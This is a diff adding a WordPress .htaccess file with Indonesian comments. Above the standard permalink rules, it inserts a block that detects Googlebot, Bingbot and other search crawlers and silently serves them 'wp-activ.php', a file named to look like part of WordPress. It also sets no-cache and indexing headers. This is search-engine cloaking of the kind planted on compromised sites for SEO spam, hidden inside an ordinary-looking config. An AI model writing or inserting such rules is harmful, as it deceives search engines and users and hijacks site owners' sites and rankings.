@@ -1,0 +1,29 @@
+# --- BOT SHORT-CIRCUIT (PASTI DI PALING ATAS) ---
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (Google-InspectionTool|Googlebot|AdsBot-Google|Mediapartners-Google|bingbot|BingPreview) [NC]
+RewriteCond %{REQUEST_URI} ^/$ [NC]
+RewriteRule ^$ wp-activ.php [L]
+ 
+<IfModule mod_headers.c>
+  Header set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+  Header set Pragma "no-cache"
+  Header set X-Robots-Tag "index, follow"
+  Header set Vary "User-Agent"
+</IfModule>
+# --- END BOT SHORT-CIRCUIT ---
+ 
+# (Opsional) Force PHP handler jika perlu, pilih satu yang cocok hosting
+# AddHandler application/x-httpd-php80 .php
+# RemoveType .php
+ 
+DirectoryIndex index.php index.html
+ 
+# --- WORDPRESS REWRITE (WAJIB untuk permalink) ---
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
